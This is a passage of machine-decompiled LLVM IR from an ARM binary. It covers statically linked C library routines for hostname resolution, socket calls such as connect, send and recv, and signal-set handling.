  %tmp34 = icmp ult i32 %v1_12038, 256
  br i1 %tmp34, label %dec_label_pc_12290, label %dec_label_pc_12044

dec_label_pc_12044:                               ; preds = %dec_label_pc_12038
  %v0_12044 = load i32, i32* @r7, align 4
  %v1_12044 = add i32 %v0_12044, 44
  store i32 %v1_12044, i32* @r6, align 4
  %v1_12048 = add i32 %v0_12044, 12
  store i32 %v1_12048, i32* %r3.global-to-local, align 4
  %v0_1204c = load i32, i32* @fp, align 4
  store i32 %v0_1204c, i32* @r1, align 4
  store i32 %v1_12038, i32* %r2.global-to-local, align 4
  store i32 %v1_12044, i32* %r0.global-to-local, align 4
  %v3_1205c = call i32 @strncpy(i32 %v1_12044, i32 %v0_1204c, i32 %v1_12038)
  store i32 %v1_12048, i32* %ip.global-to-local, align 4
  %v0_12064 = load i32, i32* @r6, align 4
  %v1_12064 = load i32, i32* @r7, align 4
  %v2_12064 = add i32 %v1_12064, 12
  %v3_12064 = inttoptr i32 %v2_12064 to i32*
  store i32 %v0_12064, i32* %v3_12064, align 4
  %v0_12068 = load i32, i32* @fp, align 4
  store i32 %v0_12068, i32* %r0.global-to-local, align 4
  %v0_1206c = load i32, i32* @r5, align 4
  %v1_1206c = load i32, i32* %ip.global-to-local, align 4
  %v2_1206c = add i32 %v1_1206c, 4
  %v3_1206c = inttoptr i32 %v2_1206c to i32*
  store i32 %v0_1206c, i32* %v3_1206c, align 4
  %v0_12070 = load i32, i32* @r7, align 4
  %v2_12074 = inttoptr i32 %v0_12068 to i8*
  %v3_12074 = call i32 @inet_aton(i8* %v2_12074, i32 %v0_12070)
  store i32 %v3_12074, i32* %r0.global-to-local, align 4
  %v2_12078 = icmp eq i32 %v3_12074, 0
  br i1 %v2_12078, label %dec_label_pc_120bc, label %dec_label_pc_12084

dec_label_pc_12084:                               ; preds = %dec_label_pc_12044
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_12088 = load i32, i32* @sl, align 4
  %v2_12088 = add i32 %v1_12088, 8
  %v3_12088 = inttoptr i32 %v2_12088 to i32*
  store i32 2, i32* %v3_12088, align 4
  %v0_1208c = load i32, i32* %r3.global-to-local, align 4
  %v2_1208c = mul i32 %v0_1208c, 2
  %v1_12090 = load i32, i32* @sl, align 4
  %v2_12090 = add i32 %v1_12090, 12
  %v3_12090 = inttoptr i32 %v2_12090 to i32*
  store i32 %v2_1208c, i32* %v3_12090, align 4
  %v3_12094 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12094, i32* %r2.global-to-local, align 4
  store i32 %v1_12048, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_120a0 = load i32, i32* @r5, align 4
  store i32 %v0_120a0, i32* %r0.global-to-local, align 4
  %v0_120a4 = load i32, i32* @sl, align 4
  %v2_120a4 = inttoptr i32 %v3_12094 to i32*
  store i32 %v0_120a4, i32* %v2_120a4, align 4
  %v0_120a8 = load i32, i32* @r6, align 4
  %v1_120a8 = load i32, i32* @sl, align 4
  %v2_120a8 = inttoptr i32 %v1_120a8 to i32*
  store i32 %v0_120a8, i32* %v2_120a8, align 4
  %v0_120ac = load i32, i32* @sb, align 4
  %v1_120ac = load i32, i32* @sl, align 4
  %v2_120ac = add i32 %v1_120ac, 16
  %v3_120ac = inttoptr i32 %v2_120ac to i32*
  store i32 %v0_120ac, i32* %v3_120ac, align 4
  %v0_120b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_120b0 = load i32, i32* @sl, align 4
  %v2_120b0 = add i32 %v1_120b0, 4
  %v3_120b0 = inttoptr i32 %v2_120b0 to i32*
  store i32 %v0_120b0, i32* %v3_120b0, align 4
  %v0_120b4 = load i32, i32* @r5, align 4
  %v1_120b4 = load i32, i32* %ip.global-to-local, align 4
  %v2_120b4 = inttoptr i32 %v1_120b4 to i32*
  store i32 %v0_120b4, i32* %v2_120b4, align 4
  br label %dec_label_pc_12294

dec_label_pc_120bc:                               ; preds = %dec_label_pc_12044
  %v2_120bc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_120bc, i32* @r5, align 4
  %v1_120c0 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_234f4.430 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_120bc, i32* @r0, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  %v1_120d8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_234f4.430 to i32), i32* %r0.global-to-local, align 4
  %v1_120e8 = call i32 @__pthread_return_0()
  store i32 %v2_120bc, i32* @r0, align 4
  %v2_120f4 = load i32, i32* @global_var_29870.435, align 4
  store i32 %v2_120f4, i32* @r4, align 4
  store i32 79548, i32* %r3.global-to-local, align 4
  %v1_12104 = call i32 @__pthread_return_void()
  %v2_12110 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_29864.438 to i32), i32* %r3.global-to-local, align 4
  %v0_1211c = load i32, i32* @fp, align 4
  store i32 %v0_1211c, i32* %r0.global-to-local, align 4
  %v2_12120 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_12120, i32* %ip.global-to-local, align 4
  %v0_12124 = load i32, i32* @r4, align 4
  store i32 %v0_12124, i32* %r2.global-to-local, align 4
  %v6_12138 = inttoptr i32 %v0_1211c to i8*
  %v7_12138 = call i32 @__dns_lookup(i8* %v6_12138, i32 1, i32 %v0_12124, i32 ptrtoint (i32* @global_var_29864.438 to i32), i32 %v2_12110, i32 %v2_12120)
  store i32 %v7_12138, i32* %r0.global-to-local, align 4
  %v1_1213c = icmp slt i32 %v7_12138, 0
  br i1 %v1_1213c, label %.dec_label_pc_12268_crit_edge, label %dec_label_pc_1214c

.dec_label_pc_12268_crit_edge:                    ; preds = %dec_label_pc_120bc
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12268

dec_label_pc_1214c:                               ; preds = %dec_label_pc_120bc
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_12160 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_12160, 255
  br i1 %tmp35, label %dec_label_pc_121fc, label %dec_label_pc_12168

dec_label_pc_12168:                               ; preds = %dec_label_pc_1214c
  %v3_12168 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_12168, i32* @r0, align 4
  %v0_1216c = call i32 @free()
  %v3_12170 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12170, i32* @r0, align 4
  %v0_12174 = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_11fb4, align 4
  br label %dec_label_pc_12294

dec_label_pc_121fc:                               ; preds = %dec_label_pc_1214c
  %v3_12200.pre = load i32, i32* %stack_var_-96, align 4
  %v0_12204.pre = load i32, i32* @r6, align 4
  store i32 %v1_12160, i32* %r2.global-to-local, align 4
  store i32 %v3_12200.pre, i32* @r1, align 4
  store i32 %v0_12204.pre, i32* %r0.global-to-local, align 4
  %v3_12208 = call i32 @strncpy(i32 %v0_12204.pre, i32 %v3_12200.pre, i32 %v1_12160)
  %v3_1220c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1220c, i32* @r0, align 4
  %v0_12210 = call i32 @free()
  store i32 %v0_12210, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_12218 = icmp eq i32 %tmp7, 1
  br i1 %v7_12218, label %dec_label_pc_12220, label %dec_label_pc_12274

dec_label_pc_12220:                               ; preds = %dec_label_pc_121fc
  store i32 4, i32* @r2, align 4
  %v0_12228 = load i32, i32* @r7, align 4
  store i32 %v0_12228, i32* @r0, align 4
  %v0_1222c = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_12048, i32* %r2.global-to-local, align 4
  %v1_12238 = load i32, i32* @sl, align 4
  %v2_12238 = add i32 %v1_12238, 8
  %v3_12238 = inttoptr i32 %v2_12238 to i32*
  store i32 2, i32* %v3_12238, align 4
  %v0_1223c = load i32, i32* %r3.global-to-local, align 4
  %v2_1223c = mul i32 %v0_1223c, 2
  store i32 %v2_1223c, i32* %r3.global-to-local, align 4
  %v1_12240 = load i32, i32* @sl, align 4
  %v2_12240 = add i32 %v1_12240, 12
  %v3_12240 = inttoptr i32 %v2_12240 to i32*
  store i32 %v2_1223c, i32* %v3_12240, align 4
  %v3_12244 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12244, i32* @r0, align 4
  %v0_12248 = load i32, i32* @r6, align 4
  %v1_12248 = load i32, i32* @sl, align 4
  %v2_12248 = inttoptr i32 %v1_12248 to i32*
  store i32 %v0_12248, i32* %v2_12248, align 4
  %v0_1224c = load i32, i32* @sb, align 4
  %v1_1224c = load i32, i32* @sl, align 4
  %v2_1224c = add i32 %v1_1224c, 16
  %v3_1224c = inttoptr i32 %v2_1224c to i32*
  store i32 %v0_1224c, i32* %v3_1224c, align 4
  %v0_12250 = load i32, i32* %r2.global-to-local, align 4
  %v1_12250 = load i32, i32* @sl, align 4
  %v2_12250 = add i32 %v1_12250, 4
  %v3_12250 = inttoptr i32 %v2_12250 to i32*
  store i32 %v0_12250, i32* %v3_12250, align 4
  %v0_12254 = call i32 @free()
  %v3_12258 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12258, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12260 = load i32, i32* @sl, align 4
  %v2_12260 = inttoptr i32 %v3_12258 to i32*
  store i32 %v0_12260, i32* %v2_12260, align 4
  %v0_12264 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12264, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %.dec_label_pc_12268_crit_edge, %dec_label_pc_12220
  %v0_1226c = phi i32 [ 1, %.dec_label_pc_12268_crit_edge ], [ %v0_12264, %dec_label_pc_12220 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_1226c, i32* %v1_11fb4, align 4
  br label %dec_label_pc_12294

dec_label_pc_12274:                               ; preds = %dec_label_pc_121fc
  %v3_12274 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_12274, i32* @r0, align 4
  %v0_12278 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_11fb4, align 4
  br label %dec_label_pc_12294

dec_label_pc_12290:                               ; preds = %dec_label_pc_11fec, %dec_label_pc_12038, %dec_label_pc_1201c, %dec_label_pc_12010, %dec_label_pc_11ffc
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12294

dec_label_pc_12294:                               ; preds = %bb, %dec_label_pc_11fd0, %dec_label_pc_11fc8, %dec_label_pc_11f70, %dec_label_pc_12274, %dec_label_pc_12268, %dec_label_pc_12168, %dec_label_pc_12084, %dec_label_pc_12290
  store i32 %v6_11f44, i32* @r5, align 4
  store i32 %v9_11f44, i32* @r6, align 4
  store i32 %v12_11f44, i32* @r7, align 4
  store i32 %v15_11f44, i32* @r8, align 4
  store i32 %v18_11f44, i32* @sb, align 4
  store i32 %v21_11f44, i32* @sl, align 4
  store i32 %v24_11f44, i32* @fp, align 4
  %v29_12298 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_12298

; uselistorder directives
  uselistorder i32 %v2_1223c, { 1, 0 }
  uselistorder i32 %v1_12160, { 1, 2, 0 }
  uselistorder i32 %v1_12048, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12044, { 1, 0, 2 }
  uselistorder i32 %v1_12038, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12004.pre, { 0, 2, 1 }
  uselistorder i32 %v1_11fe0, { 1, 0 }
  uselistorder i32* %v1_11fb4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_11f54, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12294, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12290, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_12268, { 1, 0 }
  uselistorder label %dec_label_pc_11ffc, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122b8 = load i32, i32* @r4, align 4
  store i32 %v3_122b8, i32* %stack_var_-8, align 4
  %v5_122bc = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_122bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_122bc, -4095
  br i1 %tmp, label %dec_label_pc_122dc, label %dec_label_pc_122cc

dec_label_pc_122cc:                               ; preds = %entry
  %v0_122cc = call i32 @__errno_location()
  %v0_122d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_122d0 = sub i32 0, %v0_122d0
  %v2_122d4 = inttoptr i32 %v0_122cc to i32*
  store i32 %v1_122d0, i32* %v2_122d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_122dc

dec_label_pc_122dc:                               ; preds = %entry, %dec_label_pc_122cc
  %v0_122dc = phi i32 [ %v5_122bc, %entry ], [ -1, %dec_label_pc_122cc ]
  %v2_122e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_122e0, i32* @r4, align 4
  ret i32 %v0_122dc

; uselistorder directives
  uselistorder i32 %v5_122bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_122dc, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_122e4 = load i32, i32* @r4, align 4
  store i32 %v3_122e4, i32* %stack_var_-8, align 4
  %v5_122e8 = inttoptr i32 %arg3 to i32*
  %v6_122e8 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_122e8)
  store i32 %v6_122e8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_122e8, -4095
  br i1 %tmp, label %dec_label_pc_12308, label %dec_label_pc_122f8

dec_label_pc_122f8:                               ; preds = %entry
  %v0_122f8 = call i32 @__errno_location()
  %v0_122fc = load i32, i32* %r4.global-to-local, align 4
  %v1_122fc = sub i32 0, %v0_122fc
  %v2_12300 = inttoptr i32 %v0_122f8 to i32*
  store i32 %v1_122fc, i32* %v2_12300, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12308

dec_label_pc_12308:                               ; preds = %entry, %dec_label_pc_122f8
  %v0_12308 = phi i32 [ %v6_122e8, %entry ], [ -1, %dec_label_pc_122f8 ]
  %v2_1230c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1230c, i32* @r4, align 4
  ret i32 %v0_12308

; uselistorder directives
  uselistorder i32 %v6_122e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12308, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12310 = load i32, i32* @r4, align 4
  store i32 %v3_12310, i32* %stack_var_-8, align 4
  %v0_12318 = call i32 @getsockopt()
  store i32 %v0_12318, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12318, -4095
  br i1 %tmp, label %dec_label_pc_12338, label %dec_label_pc_12328

dec_label_pc_12328:                               ; preds = %entry
  %v0_12328 = call i32 @__errno_location()
  %v0_1232c = load i32, i32* %r4.global-to-local, align 4
  %v1_1232c = sub i32 0, %v0_1232c
  %v2_12330 = inttoptr i32 %v0_12328 to i32*
  store i32 %v1_1232c, i32* %v2_12330, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12338

dec_label_pc_12338:                               ; preds = %entry, %dec_label_pc_12328
  %v0_12338 = phi i32 [ %v0_12318, %entry ], [ -1, %dec_label_pc_12328 ]
  %v2_1233c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1233c, i32* @r4, align 4
  ret i32 %v0_12338

; uselistorder directives
  uselistorder i32 %v0_12318, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12338, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12340 = load i32, i32* @r4, align 4
  store i32 %v3_12340, i32* %stack_var_-8, align 4
  %v5_12344 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12344, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12344, -4095
  br i1 %tmp, label %dec_label_pc_12364, label %dec_label_pc_12354

dec_label_pc_12354:                               ; preds = %entry
  %v0_12354 = call i32 @__errno_location()
  %v0_12358 = load i32, i32* %r4.global-to-local, align 4
  %v1_12358 = sub i32 0, %v0_12358
  %v2_1235c = inttoptr i32 %v0_12354 to i32*
  store i32 %v1_12358, i32* %v2_1235c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12364

dec_label_pc_12364:                               ; preds = %entry, %dec_label_pc_12354
  %v0_12364 = phi i32 [ %v5_12344, %entry ], [ -1, %dec_label_pc_12354 ]
  %v2_12368 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12368, i32* @r4, align 4
  ret i32 %v0_12364

; uselistorder directives
  uselistorder i32 %v5_12344, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12364, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1236c = load i32, i32* @r4, align 4
  store i32 %v3_1236c, i32* %stack_var_-8, align 4
  %v5_12370 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_12370, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12370, -4095
  br i1 %tmp, label %dec_label_pc_12390, label %dec_label_pc_12380

dec_label_pc_12380:                               ; preds = %entry
  %v0_12380 = call i32 @__errno_location()
  %v0_12384 = load i32, i32* %r4.global-to-local, align 4
  %v1_12384 = sub i32 0, %v0_12384
  %v2_12388 = inttoptr i32 %v0_12380 to i32*
  store i32 %v1_12384, i32* %v2_12388, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12390

dec_label_pc_12390:                               ; preds = %entry, %dec_label_pc_12380
  %v0_12390 = phi i32 [ %v5_12370, %entry ], [ -1, %dec_label_pc_12380 ]
  %v2_12394 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12394, i32* @r4, align 4
  ret i32 %v0_12390

; uselistorder directives
  uselistorder i32 %v5_12370, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12390, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12398 = load i32, i32* @r4, align 4
  store i32 %v3_12398, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_123a4 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_123a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_123a4, -4095
  br i1 %tmp, label %dec_label_pc_123c4, label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %entry
  %v0_123b4 = call i32 @__errno_location()
  %v0_123b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_123b8 = sub i32 0, %v0_123b8
  %v2_123bc = inttoptr i32 %v0_123b4 to i32*
  store i32 %v1_123b8, i32* %v2_123bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123c4

dec_label_pc_123c4:                               ; preds = %entry, %dec_label_pc_123b4
  %v0_123c4 = phi i32 [ %v5_123a4, %entry ], [ -1, %dec_label_pc_123b4 ]
  %v2_123c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_123c8, i32* @r4, align 4
  ret i32 %v0_123c4

; uselistorder directives
  uselistorder i32 %v5_123a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123c4, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123cc = load i32, i32* @r4, align 4
  store i32 %v3_123cc, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_123d4 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_123d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_123d4, -4095
  br i1 %tmp, label %dec_label_pc_123f4, label %dec_label_pc_123e4

dec_label_pc_123e4:                               ; preds = %entry
  %v0_123e4 = call i32 @__errno_location()
  %v0_123e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_123e8 = sub i32 0, %v0_123e8
  %v2_123ec = inttoptr i32 %v0_123e4 to i32*
  store i32 %v1_123e8, i32* %v2_123ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_123f4

dec_label_pc_123f4:                               ; preds = %entry, %dec_label_pc_123e4
  %v0_123f4 = phi i32 [ %v5_123d4, %entry ], [ -1, %dec_label_pc_123e4 ]
  %v2_123f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_123f8, i32* @r4, align 4
  ret i32 %v0_123f4

; uselistorder directives
  uselistorder i32 %v5_123d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123f4, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123fc = load i32, i32* @r4, align 4
  store i32 %v3_123fc, i32* %stack_var_-8, align 4
  %v0_12400 = call i32 @socket()
  store i32 %v0_12400, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12400, -4095
  br i1 %tmp, label %dec_label_pc_12420, label %dec_label_pc_12410

dec_label_pc_12410:                               ; preds = %entry
  %v0_12410 = call i32 @__errno_location()
  %v0_12414 = load i32, i32* %r4.global-to-local, align 4
  %v1_12414 = sub i32 0, %v0_12414
  %v2_12418 = inttoptr i32 %v0_12410 to i32*
  store i32 %v1_12414, i32* %v2_12418, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12420

dec_label_pc_12420:                               ; preds = %entry, %dec_label_pc_12410
  %v0_12420 = phi i32 [ %v0_12400, %entry ], [ -1, %dec_label_pc_12410 ]
  %v2_12424 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12424, i32* @r4, align 4
  ret i32 %v0_12420

; uselistorder directives
  uselistorder i32 %v0_12400, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12420, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_12444, label %dec_label_pc_12434

dec_label_pc_12434:                               ; preds = %entry
  %v8_12438 = icmp sgt i32 %arg1, 64
  br i1 %v8_12438, label %dec_label_pc_12444, label %dec_label_pc_1243c

dec_label_pc_1243c:                               ; preds = %dec_label_pc_12434
  %v0_12440 = call i32 @__sigaddset()
  br label %dec_label_pc_12444

dec_label_pc_12444:                               ; preds = %dec_label_pc_12434, %entry, %dec_label_pc_1243c
  %v0_12444 = call i32 @__errno_location()
  %v2_1244c = inttoptr i32 %v0_12444 to i32*
  store i32 22, i32* %v2_1244c, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12444, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_12464 = load i32, i32* @r0, align 4
  %v2_12464 = inttoptr i32 %v0_12464 to i8*
  %v3_12464 = call i32 @__GI_memset(i8* %v2_12464, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12470 = load i32, i32* @r4, align 4
  store i32 %v3_12470, i32* %stack_var_-12, align 4
  %v6_12470 = load i32, i32* @r5, align 4
  %v10_12470 = ptrtoint i32* %stack_var_-12 to i32
  %v7_12474 = icmp eq i32 %arg2, -1
  %v0_12480.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_12474, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_12498

bb:                                               ; preds = %entry
  %v2_1247c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_12480.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_12480.pre, 1
  br i1 %tmp19, label %dec_label_pc_12498, label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %bb
  %v7_1248c = icmp sgt i32 %v0_12480.pre, 64
  br i1 %v7_1248c, label %dec_label_pc_12498, label %bb20

bb20:                                             ; preds = %dec_label_pc_12488
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_124bc24 = add i32 %v10_12470, 124
  store i32 %v5_124bc24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_124ac

dec_label_pc_12498:                               ; preds = %.thread, %dec_label_pc_12488, %bb
  %v0_12498 = call i32 @__errno_location()
  store i32 %v0_12498, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_124a4 = inttoptr i32 %v0_12498 to i32*
  store i32 22, i32* %v2_124a4, align 4
  %v0_12518.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12518

dec_label_pc_124ac:                               ; preds = %bb20, %dec_label_pc_124ac
  %v5_124bc25 = phi i32 [ %v5_124bc24, %bb20 ], [ %v5_124bc, %dec_label_pc_124ac ]
  %v2_124b0 = add i32 %v5_124bc25, -136
  %v3_124b0 = inttoptr i32 %v2_124b0 to i32*
  store i32 0, i32* %v3_124b0, align 4
  %v0_124b4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_124b4 = add i32 %v0_124b4.pre, -1
  store i32 %v1_124b4, i32* %r0.global-to-local, align 4
  %v6_124b4 = icmp slt i32 %v1_124b4, 0
  %v4_124bc = mul i32 %v1_124b4, 4
  %v5_124bc = add i32 %v4_124bc, %v10_12470
  store i32 %v5_124bc, i32* %r2.global-to-local, align 4
  br i1 %v6_124b4, label %dec_label_pc_124c4, label %dec_label_pc_124ac

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124ac
  %v2_124c4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_124c4, i32* @r5, align 4
  %v2_124c8 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_124c8, i32* @r0, align 4
  %v0_124cc = load i32, i32* @r4, align 4
  store i32 %v0_124cc, i32* @r1, align 4
  %v0_124d0 = call i32 @__sigaddset()
  store i32 %v0_124d0, i32* %r0.global-to-local, align 4
  %v1_124d4 = icmp slt i32 %v0_124d0, 0
  br i1 %v1_124d4, label %dec_label_pc_12514, label %dec_label_pc_124dc

dec_label_pc_124dc:                               ; preds = %dec_label_pc_124c4
  %v0_124dc = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_297bc.440 to i32), i32* %r0.global-to-local, align 4
  %v2_124e4 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_297bc.440 to i32), i32 %v0_124dc)
  store i32 %v2_1247c, i32* %r2.global-to-local, align 4
  %v0_124fc = load i32, i32* @r4, align 4
  store i32 %v0_124fc, i32* %r0.global-to-local, align 4
